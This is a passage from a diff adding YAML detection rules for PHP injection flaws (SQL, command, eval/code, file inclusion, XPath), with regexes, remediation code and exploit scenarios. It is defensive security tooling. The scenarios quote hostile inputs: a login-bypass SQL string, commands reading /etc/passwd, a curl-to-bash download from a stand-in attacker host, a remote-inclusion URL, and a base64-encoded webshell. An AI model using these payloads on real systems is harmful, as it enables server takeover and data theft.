@@ -1,0 +1,2030 @@
+rules:
+- rule_id: PHP-INJ-001
+  title: SQL Injection via String Interpolation
+  description: 'Detects SQL queries built with PHP string interpolation or concatenation with user-controlled input ($_GET, $_POST, $_REQUEST). Identifies both direct superglobal usage and indirect tainted
+    variable flow into query construction across legacy mysql_, mysqli, PDO raw query, and pg_ APIs.
+
+    '
+  language: php
+  category: injection
+  severity: Critical
+  confidence: 0.95
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - sql-injection
+  - mysqli
+  - pdo
+  - sqli
+  - database
+  patterns:
+  - type: regex
+    pattern: (?:mysql_query|mysqli_query|mysqli::query|pg_query)\s*\(\s*[^,]*['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*\$(?:_GET|_POST|_REQUEST|_COOKIE)\[
+  - type: regex
+    pattern: \$(?:pdo|db|conn|connection|mysqli)\s*->\s*query\s*\(\s*"(?:SELECT|INSERT|UPDATE|DELETE)\b[^"]*\$
+  - type: regex
+    pattern: (?:SELECT|INSERT|UPDATE|DELETE)\b[^"']*(?:\.\s*\$(?:_GET|_POST|_REQUEST|_COOKIE)\[|\$\{?\w*(?:input|user|param|request))
+  - type: regex
+    pattern: '"(?:SELECT|INSERT|UPDATE|DELETE)\b[^"]*"\s*\.\s*\$(?:_GET|_POST|_REQUEST|_COOKIE|_SERVER)\['
+  - type: regex
+    pattern: \$\w*(?:sql|query|stmt)\w*\s*=\s*"(?:SELECT|INSERT|UPDATE|DELETE)\b[^"]*"\s*\.\s*\$
+  - type: regex
+    pattern: \$\w*(?:sql|query)\w*\s*\.=\s*\$(?:_GET|_POST|_REQUEST|_COOKIE)\[
+    description: Concatenation assignment appending user input to SQL query string
+  - type: regex
+    pattern: sprintf\s*\(\s*['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*%s[^'"]*['"]\s*,\s*\$(?:_GET|_POST|_REQUEST|_COOKIE)\[
+    description: SQL query built via sprintf with unsanitized superglobal substitution
+  - type: regex
+    pattern: \bDB::(?:select|insert|update|delete|statement)\s*\(\s*"[^"]*"\s*\.\s*\$
+    description: Laravel raw DB facade query with string concatenation
+  - type: regex
+    pattern: ->(?:whereRaw|selectRaw|havingRaw|orderByRaw|groupByRaw)\s*\(\s*"[^"]*"\s*\.\s*\$
+    description: Laravel raw query methods with concatenated user input
+  - type: regex
+    pattern: \bwpdb\s*->\s*query\s*\(\s*"(?:SELECT|INSERT|UPDATE|DELETE)\b[^"]*\$
+    description: WordPress wpdb->query with string interpolation
+  anti_patterns:
+  - prepare(
+  - bindParam
+  - bindValue
+  - execute(array
+  - real_escape_string
+  - PDO::PARAM
+  - ->prepare
+  - DB::select(
+  - Eloquent
+  - ->where(
+  - ->find(
+  - ->findOrFail(
+  - createQueryBuilder
+  - ->setParameter
+  - Doctrine\DBAL
+  - $wpdb->prepare
+  - esc_sql(
+  - ->bind(
+  context_awareness:
+    surrounding_context_patterns:
+    - function\s+\w+\s*\([^)]*\$(?:_GET|_POST|_REQUEST)
+    - \$\w+\s*=\s*\$(?:_GET|_POST|_REQUEST|_COOKIE)\[
+    - \$\w+\s*=\s*filter_input\s*\(
+    - \$\w+\s*=\s*\$request\s*->\s*(?:input|get|post|query)\s*\(
+    taint_source_indicators:
+    - $_GET
+    - $_POST
+    - $_REQUEST
+    - $_COOKIE
+    - $_SERVER["QUERY_STRING"]
+    - $_SERVER["HTTP_
+    - $request->input(
+    - $request->get(
+    - $request->query(
+    - file_get_contents("php://input")
+    - $this->request->getData(
+    - Input::get(
+    taint_sink_indicators:
+    - mysql_query(
+    - mysqli_query(
+    - mysqli::query(
+    - pg_query(
+    - ->query(
+    - ->exec(
+    - DB::select(
+    - DB::statement(
+    - $wpdb->query(
+    - oci_parse(
+    - sqlsrv_query(
+    sanitization_patterns:
+    - prepare(
+    - bindParam(
+    - bindValue(
+    - real_escape_string(
+    - mysqli_real_escape_string(
+    - addslashes(
+    - intval(
+    - (int)
+    - filter_var(
+    - filter_input(
+    - $wpdb->prepare(
+    - esc_sql(
+    - absint(
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_presence) * exploitability_score
+    exploitability_score: 0.95
+    impact_subscore: 9.8
+    data_classification_risk: high
+  exploit_scenario:
+    attack_example: 'An attacker submits a crafted username via a login form: POST /login.php with body username='' OR ''1''=''1'' --&password=anything. The application constructs the query: "SELECT * FROM
+      users WHERE username='''' OR ''1''=''1'' --'' AND password=''anything''" This bypasses authentication and logs the attacker in as the first user (often admin).
+
+      '
+    example_payload: ''' OR ''1''=''1'' -- '
+    attacker_objective: 'Extract sensitive data (credentials, PII, financial records), bypass authentication, escalate privileges, modify or delete data, or achieve remote code execution via SELECT INTO
+      OUTFILE or LOAD_FILE().
+
+      '
+  confidence_factors:
+    pattern_strength: 0.9
+    context_match: 0.95
+    proximity_to_user_input: 0.98
+    sanitization_absence: 0.95
+    historical_accuracy: 0.92
+  impact: 'Complete database compromise including data theft, unauthorized modification,
+
+    authentication bypass, and potential RCE via INTO OUTFILE or LOAD_FILE.
+
+    '
+  remediation: "Use PDO prepared statements:\n  $stmt = $pdo->prepare(\"SELECT * FROM users WHERE id = :id\");\n  $stmt->execute(['id' => $userId]);\nOr mysqli prepared statements:\n  $stmt = $mysqli->prepare(\"\
+    SELECT * FROM users WHERE id = ?\");\n  $stmt->bind_param(\"s\", $userId);\n\nFramework-specific fixes:\n\nLaravel (Eloquent ORM / Query Builder):\n  // Use Eloquent models with automatic parameterization\n\
+    \  $user = User::where('email', $request->input('email'))->first();\n  // Use query builder bindings\n  $users = DB::select('SELECT * FROM users WHERE id = ?', [$id]);\n  // Use whereRaw with bindings\n\
+    \  $results = DB::table('users')->whereRaw('email = ?', [$email])->get();\n\nSymfony (Doctrine ORM / DBAL):\n  // Doctrine QueryBuilder\n  $qb = $em->createQueryBuilder();\n  $qb->select('u')->from('User',\
+    \ 'u')->where('u.email = :email')\n     ->setParameter('email', $email);\n  // Doctrine DBAL\n  $stmt = $conn->prepare('SELECT * FROM users WHERE id = :id');\n  $result = $stmt->executeQuery(['id' =>\
+    \ $id]);\n\nWordPress:\n  // Always use wpdb->prepare\n  $results = $wpdb->get_results(\n      $wpdb->prepare(\"SELECT * FROM {$wpdb->prefix}users WHERE id = %d\", $id)\n  );\n\nCodeIgniter:\n  // Use\
+    \ Query Builder\n  $this->db->where('id', $id);\n  $query = $this->db->get('users');\n  // Or query bindings\n  $query = $this->db->query(\"SELECT * FROM users WHERE id = ?\", array($id));\n"
+  references:
+  - https://owasp.org/Top10/A03_2021-Injection/
+  - https://cwe.mitre.org/data/definitions/89.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+  - https://laravel.com/docs/queries#introduction
+  - https://www.doctrine-project.org/projects/doctrine-dbal/en/latest/reference/security.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: low
+    false_positive_rate: low
+    created: '2024-01-01'
+    author: security-rules-team
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - PHP-INJ-003
+    - PHP-INJ-004
+    escalation_chain: SQL injection may chain with PHP-INJ-003 (code injection) if database-stored payloads are later evaluated, or PHP-INJ-004 (file inclusion) if query results influence include paths.
+    combined_risk_multiplier: 1.5
+  detection_layer: 1
+- rule_id: PHP-INJ-002
+  title: Command Injection via system/exec/passthru
+  description: 'Detects PHP command execution functions (system, exec, passthru, shell_exec, popen, proc_open, backtick operator) receiving user-controlled input directly or through string concatenation.
+    Also detects indirect command injection through variables derived from superglobals without proper escaping via escapeshellarg/escapeshellcmd.
+
+    '
+  language: php
+  category: injection
+  severity: Critical
+  confidence: 0.95
+  cwe: CWE-78
+  owasp: A03:2021-Injection
+  tags:
+  - command-injection
+  - rce
+  - system-exec
+  - os-command
+  patterns:
+  - type: regex
+    pattern: (?:system|exec|passthru|shell_exec|popen|proc_open)\s*\(\s*(?:\$_GET|\$_POST|\$_REQUEST|\$_COOKIE|\$_SERVER)\[
+  - type: regex
+    pattern: (?:system|exec|passthru|shell_exec|popen)\s*\(\s*"[^"]*"\s*\.\s*\$(?:_GET|_POST|_REQUEST)\[
+  - type: regex
+    pattern: (?:system|exec|passthru|shell_exec|popen)\s*\(\s*\$\w*(?:cmd|command|input|user|param)\b
+  - type: regex
+    pattern: '`\s*[^`]*\$(?:_GET|_POST|_REQUEST|_COOKIE)\['
+  - type: regex
+    pattern: preg_replace\s*\(\s*['"][^'"]*e[^'"]*["']
+  - type: regex
+    pattern: pcntl_exec\s*\(\s*\$(?:_GET|_POST|_REQUEST|_COOKIE)\[
+    description: Process control execution with user-controlled binary path
+  - type: regex
+    pattern: proc_open\s*\(\s*(?:"[^"]*"\s*\.\s*)?\$\w*(?:cmd|command|input|user|arg)
+    description: proc_open with tainted command string
+  - type: regex
+    pattern: (?:system|exec|passthru|shell_exec)\s*\(\s*sprintf\s*\([^)]*\$(?:_GET|_POST|_REQUEST)\[
+    description: Command execution using sprintf with unsanitized superglobal
+  - type: regex
+    pattern: \$\w*(?:cmd|command)\s*=\s*['"][^'"]*['"]\s*\.\s*\$(?:_GET|_POST|_REQUEST)\[.*?(?:system|exec|passthru|shell_exec)\s*\(\s*\$\w*(?:cmd|command)
+    description: Two-step command construction then execution with tainted input
+  anti_patterns:
+  - escapeshellarg
+  - escapeshellcmd
+  - filter_input
+  - FILTER_SANITIZE
+  - Symfony\Component\Process\Process
+  - new Process(
+  - Process::fromShellCommandline
+  - in_array(
+  - preg_match('/^[a-zA-Z0-9
+  - ctype_alnum(
+  context_awareness:
+    surrounding_context_patterns:
+    - \$\w+\s*=\s*\$(?:_GET|_POST|_REQUEST)\[['"][^'"]+['"]\]
+    - if\s*\(\s*isset\s*\(\s*\$(?:_GET|_POST)\[
+    - \$\w*(?:cmd|command|arg|param)\s*=\s*\$(?:_GET|_POST|_REQUEST)\[
+    - Route::\w+\([^)]*function\s*\([^)]*\$request
+    taint_source_indicators:
+    - $_GET
+    - $_POST
+    - $_REQUEST
+    - $_COOKIE
+    - $_SERVER["HTTP_
+    - $_SERVER["QUERY_STRING"]
+    - $request->input(
+    - $request->get(
+    - php://input
+    - $argv[
+    - getenv(
+    taint_sink_indicators:
+    - system(
+    - exec(
+    - passthru(
+    - shell_exec(
+    - popen(
+    - proc_open(
+    - pcntl_exec(
+    - backtick operator `...`
+    - ob_start("system"
+    - call_user_func("system"
+    - array_map("exec"
+    sanitization_patterns:
+    - escapeshellarg(
+    - escapeshellcmd(
+    - filter_var(
+    - filter_input(
+    - preg_match(
+    - ctype_alnum(
+    - ctype_alpha(
+    - intval(
+    - (int)
+    - in_array(
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_presence) * exploitability_score
+    exploitability_score: 0.92
+    impact_subscore: 10.0
+    data_classification_risk: critical
+  exploit_scenario:
+    attack_example: 'A web application provides a network diagnostic page that pings a user-supplied host: system("ping -c 4 " . $_GET[''host'']). An attacker supplies host=127.0.0.1;cat /etc/passwd which
+      executes both the ping and the cat command, disclosing the system password file. Escalation uses host=127.0.0.1;curl attacker.com/shell.sh|bash to download and execute a reverse shell.
+
+      '
+    example_payload: 127.0.0.1; cat /etc/passwd
+    attacker_objective: 'Execute arbitrary operating system commands to read sensitive files, install backdoors, establish reverse shells, pivot to internal networks, exfiltrate data, or achieve full server
+      takeover.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.93
+    context_match: 0.95
+    proximity_to_user_input: 0.97
+    sanitization_absence: 0.96
+    historical_accuracy: 0.94
+  impact: 'Arbitrary OS command execution enabling full server compromise,
+
+    data exfiltration, lateral movement, and persistent backdoor installation.
+
+    '
+  remediation: "- Use escapeshellarg() for individual arguments\n- Use escapeshellcmd() for entire commands (less secure)\n- Prefer PHP built-in functions over shell commands\n- Apply strict input validation\
+    \ with allowlists\n- Disable dangerous functions in php.ini: disable_functions\n\nFramework-specific fixes:\n\nLaravel:\n  // Use Symfony Process component (bundled with Laravel)\n  use Symfony\\Component\\\
+    Process\\Process;\n  $process = new Process(['ping', '-c', '4', $validatedHost]);\n  $process->run();\n  // Validate input with Laravel rules\n  $validated = $request->validate(['host' => 'required|ip']);\n\
+    \nSymfony:\n  // Use the Process component with array arguments (no shell)\n  use Symfony\\Component\\Process\\Process;\n  $process = new Process(['/usr/bin/ping', '-c', '4', $host]);\n  $process->run();\n\
+    \  // Never use Process::fromShellCommandline with user input\n\nWordPress:\n  // Use WP_Filesystem methods instead of shell commands\n  $wp_filesystem->get_contents($file);\n  // If shell is absolutely\
+    \ required, sanitize rigorously\n  $safe = escapeshellarg(sanitize_text_field($_POST['input']));\n\nCodeIgniter:\n  // Validate with form_validation library\n  $this->form_validation->set_rules('host',\
+    \ 'Host', 'required|valid_ip');\n  // Use built-in PHP functions instead of shell commands\n  // e.g., dns_get_record() instead of shell nslookup\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/78.html
+  - https://owasp.org/Top10/A03_2021-Injection/
+  - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+  - https://symfony.com/doc/current/components/process.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: low
+    false_positive_rate: very_low
+    created: '2024-01-01'
+    author: security-rules-team
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - PHP-INJ-003
+    - PHP-INJ-001
+    escalation_chain: Command injection is often the final escalation target from other injection types. SQL injection (PHP-INJ-001) may chain into command injection via MySQL sys_exec UDF or INTO OUTFILE
+      + LFI.
+    combined_risk_multiplier: 2.0
+  detection_layer: 1
+- rule_id: PHP-INJ-003
+  title: Code Injection via eval/assert/preg_replace-e
+  description: 'Detects PHP code injection through eval(), assert(), create_function(), preg_replace with /e modifier, or dynamic function invocation patterns such as $func() and call_user_func() where
+    the function name or code body is derived from user-controlled input. Includes detection of obfuscated eval patterns using base64_decode, gzinflate, and similar encoding/compression wrappers commonly
+    seen in webshells.
+
+    '
+  language: php
+  category: injection
+  severity: Critical
+  confidence: 0.96
+  cwe: CWE-94
+  owasp: A03:2021-Injection
+  tags:
+  - code-injection
+  - eval
+  - rce
+  - webshell
+  - dynamic-execution
+  patterns:
+  - type: regex
+    pattern: \beval\s*\(\s*(?:\$_GET|\$_POST|\$_REQUEST|\$_COOKIE|\$_SERVER)\[
+  - type: regex
+    pattern: \beval\s*\(\s*\$\w*(?:input|user|param|data|code|cmd)\b
+  - type: regex
+    pattern: \bassert\s*\(\s*(?:\$_GET|\$_POST|\$_REQUEST|\$_COOKIE)\[
+  - type: regex
+    pattern: create_function\s*\(\s*[^,]*,\s*(?:\$_GET|\$_POST|\$_REQUEST)\[
+  - type: regex
+    pattern: \beval\s*\(\s*(?:base64_decode|gzinflate|gzuncompress|str_rot13)\s*\(
+  - type: regex
+    pattern: call_user_func(?:_array)?\s*\(\s*\$(?:_GET|_POST|_REQUEST|_COOKIE)\[
+    description: Dynamic function invocation with user-controlled function name
+  - type: regex
+    pattern: \$\w*(?:func|function|callback|handler|action)\s*\(\s*\$(?:_GET|_POST|_REQUEST)\[
+    description: Variable function call with user-controlled arguments
+  - type: regex
+    pattern: \$(?:_GET|_POST|_REQUEST|_COOKIE)\[['"][^'"]+['"]\]\s*\(
+    description: Direct superglobal used as function name for invocation
+  - type: regex
+    pattern: array_map\s*\(\s*\$(?:_GET|_POST|_REQUEST)\[
+    description: array_map with user-controlled callback function
+  - type: regex
+    pattern: usort\s*\(\s*[^,]+,\s*\$(?:_GET|_POST|_REQUEST)\[
+    description: usort with user-controlled comparison callback
+  - type: regex
+    pattern: \beval\s*\(\s*(?:str_replace|substr|implode|join)\s*\([^)]*\$
+    description: Obfuscated eval with string manipulation wrapping tainted data
+  anti_patterns:
+  - // safe
+  - filter_var
+  - Twig\Environment
+  - ->render(
+  - blade
+  - '{{ }}'
+  - twig
+  - ->compile(
+  - Sandbox
+  - SecurityPolicy
+  - is_callable($allowed
+  - in_array($func
+  context_awareness:
+    surrounding_context_patterns:
+    - \$\w+\s*=\s*\$(?:_GET|_POST|_REQUEST)\[['"][^'"]+['"]\]
+    - \$\w+\s*=\s*file_get_contents\s*\(\s*['"]php://input['"]\s*\)
+    - \$\w+\s*=\s*base64_decode\s*\(\s*\$
+    - if\s*\(\s*isset\s*\(\s*\$(?:_GET|_POST)\[
+    taint_source_indicators:
+    - $_GET
+    - $_POST
+    - $_REQUEST
+    - $_COOKIE
+    - php://input
+    - $_SERVER["HTTP_
+    - $request->input(
+    - $request->getContent()
+    - base64_decode(
+    - json_decode(
+    - unserialize(
+    taint_sink_indicators:
+    - eval(
+    - assert(
+    - create_function(
+    - call_user_func(
+    - call_user_func_array(
+    - preg_replace with /e
+    - array_map(
+    - array_filter(
+    - usort(
+    - uasort(
+    - ReflectionFunction
+    sanitization_patterns:
+    - filter_var(
+    - filter_input(
+    - preg_match(
+    - in_array(
+    - ctype_alpha(
+    - htmlspecialchars(
+    - is_numeric(
+    - is_callable($allowed
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_presence) * exploitability_score
+    exploitability_score: 0.9
+    impact_subscore: 10.0
+    data_classification_risk: critical
+  exploit_scenario:
+    attack_example: 'A legacy CMS has a template evaluation feature: eval("echo " . $_POST[''template''] . ";"); An attacker sends template=system(''id'') which executes the OS id command. Escalation: template=file_put_contents(''/var/www/html/shell.php'',
+      base64_decode(''PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=='')) writes a persistent webshell to disk.
+
+      '
+    example_payload: system('cat /etc/passwd')
+    attacker_objective: 'Execute arbitrary PHP code within the application context to read files, modify data, install persistent backdoors (webshells), execute OS commands, or pivot deeper into the infrastructure.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.95
+    context_match: 0.93
+    proximity_to_user_input: 0.96
+    sanitization_absence: 0.97
+    historical_accuracy: 0.91
+  impact: 'Arbitrary PHP code execution in the application context with full
+
+    access to the file system, database, and network. Can lead to
+
+    webshell installation, data exfiltration, and full server compromise.
+
+    '
+  remediation: "- Never use eval() with user input\n- Replace create_function() with anonymous functions (closures)\n- Remove preg_replace /e modifier, use preg_replace_callback instead\n- Disable eval\
+    \ in php.ini if not needed\n- Never use variable function calls with user-controlled names\n\nFramework-specific fixes:\n\nLaravel:\n  // Use Blade templating instead of eval for dynamic content\n \
+    \ return view('template', ['data' => $data]);\n  // Use config/route-based action dispatch instead of dynamic calls\n  $action = match($request->input('action')) {\n      'list' => [Controller::class,\
+    \ 'list'],\n      'show' => [Controller::class, 'show'],\n      default => abort(400),\n  };\n\nSymfony:\n  // Use Twig templating engine with auto-escaping\n  return $this->render('template.html.twig',\
+    \ ['data' => $data]);\n  // Twig sandbox mode for user-provided templates\n  $sandbox = new \\Twig\\Extension\\SandboxExtension($policy);\n  $twig->addExtension($sandbox);\n\nWordPress:\n  // Use shortcodes\
+    \ or template parts instead of eval\n  do_shortcode($content);\n  get_template_part('content', $type);\n  // Never eval user-submitted content in widgets or custom fields\n\nCodeIgniter:\n  // Use CI\
+    \ view system\n  $this->load->view('template', $data);\n  // Use route-based controller dispatch\n  // Validate action names against allowlist\n  if (in_array($action, $allowed_actions)) {\n      $this->$action();\n\
+    \  }\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/94.html
+  - https://owasp.org/Top10/A03_2021-Injection/
+  - https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+    false_positive_rate: very_low
+    created: '2024-01-01'
+    author: security-rules-team
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PHP-INJ-001
+    - PHP-INJ-002
+    - PHP-INJ-004
+    escalation_chain: 'Code injection often results from chained exploits: SQL injection (PHP-INJ-001) stores malicious code, file inclusion (PHP-INJ-004) or deserialization loads it, and eval executes
+      it. The eval sink is the most direct path to RCE.'
+    combined_risk_multiplier: 2.0
+  detection_layer: 1
+- rule_id: PHP-INJ-004
+  title: File Inclusion via include/require with User Input
+  description: 'Detects local file inclusion (LFI) and remote file inclusion (RFI) vulnerabilities through include, include_once, require, or require_once statements that incorporate user-controlled input
+    in the file path. Covers direct superglobal usage, tainted variable intermediaries, and path traversal patterns (../) in included paths. Also detects indirect inclusion through variable variables and
+    dynamic path construction.
+
+    '
+  language: php
+  category: injection
+  severity: Critical
+  confidence: 0.93
+  cwe: CWE-98
+  owasp: A03:2021-Injection
+  tags:
+  - lfi
+  - rfi
+  - file-inclusion
+  - rce
+  - path-traversal
+  - directory-traversal
+  patterns:
+  - type: regex
+    pattern: (?:include|include_once|require|require_once)\s*\(\s*(?:\$_GET|\$_POST|\$_REQUEST|\$_COOKIE)\[
+  - type: regex
+    pattern: (?:include|include_once|require|require_once)\s*\(\s*\$\w*(?:page|file|template|module|path|lang|dir)\b
+  - type: regex
+    pattern: (?:include|include_once|require|require_once)\s*\(\s*"[^"]*"\s*\.\s*\$(?:_GET|_POST|_REQUEST)\[
+  - type: regex
+    pattern: (?:include|require)\s*\$\w*(?:page|file|path|template)\b
+  - type: regex
+    pattern: (?:include|include_once|require|require_once)\s*\(\s*\$\w+\s*\.\s*['"]\.php['"]\s*\)
+    description: Dynamic inclusion with variable prefix and forced .php extension (bypassable via null bytes on PHP < 5.3.4)
+  - type: regex
+    pattern: (?:include|include_once|require|require_once)\s*\(\s*['"][^'"]*['"]?\s*\.\s*\$(?:_GET|_POST|_REQUEST|_COOKIE)\[['"][^'"]+['"]\]\s*\.\s*['"]
+    description: Sandwich inclusion with user input between path prefix and suffix
+  - type: regex
+    pattern: \$\w*(?:controller|class|action|view|theme|plugin)\s*=\s*\$(?:_GET|_POST|_REQUEST)\[.*?(?:include|require)
+    description: Variable assigned from superglobal then used in subsequent include
+  - type: regex
+    pattern: file_get_contents\s*\(\s*\$(?:_GET|_POST|_REQUEST|_COOKIE)\[
+    description: File read via file_get_contents with user-controlled path (LFI variant)
+  anti_patterns:
+  - basename(
+  - realpath(
+  - in_array
+  - allowlist
+  - whitelist
+  - switch (
+  - Composer\Autoload
+  - spl_autoload
+  - classmap
+  - PSR-4
+  - ->render(
+  - view(
+  - Twig_Loader
+  - Blade::render
+  - get_template_part
+  - locate_template
+  - pathinfo(
+  context_awareness:
+    surrounding_context_patterns:
+    - \$\w+\s*=\s*\$(?:_GET|_POST|_REQUEST)\[['"](?:page|file|template|view|module|lang|theme|controller|action)['"]\]
+    - if\s*\(\s*file_exists\s*\(
+    - if\s*\(\s*is_file\s*\(
+    - \.\.\/
+    taint_source_indicators:
+    - $_GET
+    - $_POST
+    - $_REQUEST
+    - $_COOKIE
+    - $_SERVER["PATH_INFO"]
+    - $_SERVER["REQUEST_URI"]
+    - $request->input(
+    - $request->get(
+    - $request->query(
+    - $request->segment(
+    taint_sink_indicators:
+    - include(
+    - include_once(
+    - require(
+    - require_once(
+    - include $
+    - require $
+    - file_get_contents(
+    - fopen(
+    - readfile(
+    - file(
+    - highlight_file(
+    - show_source(
+    sanitization_patterns:
+    - basename(
+    - realpath(
+    - in_array(
+    - str_replace("../", ""
+    - str_replace("..", ""
+    - pathinfo(
+    - preg_match(
+    - ctype_alpha(
+    - ctype_alnum(
+  severity_scoring:
+    severity_weight: 9
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_presence) * exploitability_score
+    exploitability_score: 0.88
+    impact_subscore: 9.5
+    data_classification_risk: critical
+  exploit_scenario:
+    attack_example: 'A PHP application uses include("pages/" . $_GET[''page''] . ".php") to load pages dynamically. An attacker sets page=../../../../etc/passwd%00 (null byte to truncate .php suffix on
+      older PHP) to read the password file via LFI. For RFI (if allow_url_include=On), the attacker uses page=http://evil.com/shell which causes the server to fetch and execute attacker-hosted PHP code.
+      Modern attacks use php://filter/convert.base64-encode/ resource=config to exfiltrate PHP source code including database credentials.
+
+      '
+    example_payload: ../../../../etc/passwd%00
+    attacker_objective: 'Read sensitive server files (configuration, credentials, source code) via LFI, or execute arbitrary remote code via RFI. PHP filter wrappers enable source code disclosure even when
+      direct file reading fails.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.88
+    context_match: 0.9
+    proximity_to_user_input: 0.95
+    sanitization_absence: 0.93
+    historical_accuracy: 0.89
+  impact: 'Local File Inclusion (LFI) allows reading arbitrary server files
+
+    (/etc/passwd, PHP source code, configuration files with credentials).
+
+    Remote File Inclusion (RFI) enables executing attacker-hosted PHP code
+
+    on the server, resulting in full compromise. PHP wrapper attacks
+
+    (php://filter) can disclose source code even with restrictive configs.
+
+    '
+  remediation: "- Use a strict allowlist of permitted file inclusions\n- Use basename() to strip directory traversal sequences\n- Validate with realpath() to ensure files are within expected directory\n\
+    - Set allow_url_include = Off in php.ini\n- Use autoloading (Composer) instead of manual includes\n\nFramework-specific fixes:\n\nLaravel:\n  // Use Blade views with the view() helper (auto-resolved\
+    \ from resources/views)\n  return view('pages.' . $validated_page, $data);\n  // Validate page parameter against known views\n  $page = $request->validate(['page' => 'required|in:home,about,contact']);\n\
+    \  // Use named routes instead of dynamic includes\n  Route::get('/{page}', [PageController::class, 'show'])->whereIn('page', $allowed);\n\nSymfony:\n  // Use Twig template rendering (restricted to\
+    \ templates/ directory)\n  return $this->render('pages/' . $validatedPage . '.html.twig', $data);\n  // Twig Loader restricts template paths automatically\n  $loader = new \\Twig\\Loader\\FilesystemLoader('/path/to/templates');\n\
+    \  // Validate template name against allowlist\n  if (!in_array($page, $allowedPages)) { throw new NotFoundHttpException(); }\n\nWordPress:\n  // Use locate_template with validate\n  $template = locate_template(['page-'\
+    \ . sanitize_file_name($slug) . '.php']);\n  if ($template) { load_template($template, true); }\n  // Use get_template_part with fixed directory\n  get_template_part('template-parts/content', sanitize_key($type));\n\
+    \nCodeIgniter:\n  // Use CI view system (restricted to views directory)\n  $this->load->view('pages/' . $validated_page, $data);\n  // Validate page against allowlist\n  if (!in_array($page, $this->allowed_pages))\
+    \ { show_404(); }\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/98.html
+  - https://owasp.org/Top10/A03_2021-Injection/
+  - https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+    false_positive_rate: low
+    created: '2024-01-01'
+    author: security-rules-team
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PHP-INJ-001
+    - PHP-INJ-002
+    - PHP-INJ-003
+    escalation_chain: File inclusion vulnerabilities frequently chain with other injection types. LFI can be escalated to RCE by including log files poisoned with PHP code (via PHP-INJ-002 command injection
+      payloads in User-Agent), or by including files written via SQL injection INTO OUTFILE (PHP-INJ-001).
+    combined_risk_multiplier: 1.8
+  detection_layer: 1
+- rule_id: PHP-INJ-005
+  title: XPath Injection via Unsanitized Input
+  description: 'Detects XPath query construction with user-controlled input through string concatenation or interpolation. XPath injection targets applications that use XML data stores or process XML documents
+    using DOMXPath or SimpleXML xpath methods. Covers direct superglobal injection, tainted variable flow, and dynamically constructed XPath predicates used in authentication, authorization, or data retrieval
+    contexts.
+
+    '
+  language: php
+  category: injection
+  severity: High
+  confidence: 0.85
+  cwe: CWE-643
+  owasp: A03:2021-Injection
+  tags:
+  - xpath-injection
+  - xml
+  - authentication-bypass
+  - data-extraction
+  - nosql
+  patterns:
+  - type: regex
+    pattern: ->(?:query|evaluate|xpath)\s*\(\s*"[^"]*"\s*\.\s*\$(?:_GET|_POST|_REQUEST)\[
+  - type: regex
+    pattern: ->(?:query|evaluate|xpath)\s*\(\s*"[^"]*\$(?:_GET|_POST|_REQUEST|username|password|input)\b
+  - type: regex
+    pattern: xpath\s*\(\s*"[^"]*"\s*\.\s*\$\w*(?:input|user|param)\b
+  - type: regex
+    pattern: new\s+DOMXPath\s*\([^)]*\).*->(?:query|evaluate)\s*\(\s*"[^"]*"\s*\.\s*\$
+    description: DOMXPath instantiation followed by query with concatenated variable
+  - type: regex
+    pattern: simplexml_load_(?:file|string)\s*\([^)]*\)\s*->\s*xpath\s*\(\s*"[^"]*"\s*\.\s*\$
+    description: SimpleXML xpath query with concatenated user-controlled input
+  - type: regex
+    pattern: sprintf\s*\(\s*['"][^'"]*(?://|/\*)\w+\[.*?%s[^'"]*['"]\s*,\s*\$(?:_GET|_POST|_REQUEST)\[
+    description: XPath query constructed via sprintf with unsanitized superglobal
+  - type: regex
+    pattern: \$\w*(?:xpath|xquery|expression)\s*=\s*['"][^'"]*['"]\s*\.\s*\$(?:_GET|_POST|_REQUEST)\[
+    description: XPath expression variable built with concatenated superglobal
+  anti_patterns:
+  - addslashes
+  - htmlspecialchars
+  - preg_replace
+  - DOMDocument::validate
+  - XPath::quote
+  - xpath_quote
+  - str_replace("'", ""
+  - parameterized
+  - in_array(
+  - ctype_alnum(
+  - Symfony\Component\DomCrawler
+  - ->filterXPath(
+  context_awareness:
+    surrounding_context_patterns:
+    - new\s+DOMDocument\s*\(
+    - new\s+DOMXPath\s*\(
+    - simplexml_load_(?:file|string)\s*\(
+    - \$\w+\s*=\s*\$(?:_GET|_POST|_REQUEST)\[['"](?:username|password|search|query|id|name)['"]\]
+    - ->loadXML\s*\(
